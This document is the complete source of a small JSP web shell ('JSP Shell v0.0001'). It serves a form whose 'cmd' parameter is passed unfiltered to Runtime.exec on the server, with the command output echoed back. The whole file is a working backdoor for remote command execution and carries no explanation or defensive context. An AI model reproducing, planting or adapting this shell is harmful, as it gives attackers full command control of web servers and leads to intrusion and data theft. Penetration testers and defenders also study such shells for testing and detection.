<html>
<head></head>
<body>
<%@ page import="java.util.*,java.io.*"%> <% %>
<pre>
[red.cow.cat]	[JSP Shell v0.0001]
[All credits to the people of Netspi on this one]
</pre>
<br>
<form method="GET" name="myform">
	<input type="text" name="cmd" />
	<input type="submit" value="Execute" />
</form>
<%
if (request.getParameter("cmd") != null) {
	out.println("<b>Command: </b>" + request.getParameter("cmd") + "<br><br>");
	out.println("<pre>");
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while ( disr != null ) {
		out.println(disr);
		disr = dis.readLine();
	}
	out.println("</pre>");
}
%>
</body>
</html>
